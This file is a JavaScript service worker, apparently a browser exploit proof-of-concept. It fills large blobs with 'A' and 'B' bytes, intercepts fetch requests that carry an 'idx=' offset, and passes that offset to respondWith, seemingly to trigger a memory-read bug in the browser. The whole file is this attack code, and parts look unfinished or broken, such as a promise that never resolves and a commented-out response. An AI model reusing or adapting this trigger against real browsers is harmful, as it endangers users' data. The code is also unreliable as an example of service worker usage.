const version = "0.1";
const cacheName = "exploit-cache";

var subblob = new Blob(["A".repeat(0x20000) + "B".repeat(0x20000)], {});
var gblob = new Blob([subblob, subblob], {});

self.addEventListener('install', event => { console.log("received install event"); event.waitUntil(self.skipWaiting()); });

self.addEventListener('activate', event => {
	console.log("received activate event");
	event.waitUntil(clients.claim());
});

self.addEventListener('fetch', event => {
	console.log("received fetch event!");
	event.waitUntil(function() {
		if (event.request.url.indexOf("idx=") == -1) {
			console.log("passing thru request for " + event.request.url)
			return fetch(event.request);
		} else {
			let offset = parseInt(event.request.url.split("idx=")[1]);
			console.log("got real read request for offset 0x" + offset.toString(16));

			let mypromise = new Promise((resolve, reject) => { return new Response(gblob, {status: 420, statusText: "blah"}); });
			event.respondWith(fetch("bigfile.txt"), offset);
			//event.respondWith(mypromise, offset);
			console.log("responded to real request...");
		}
	}());
});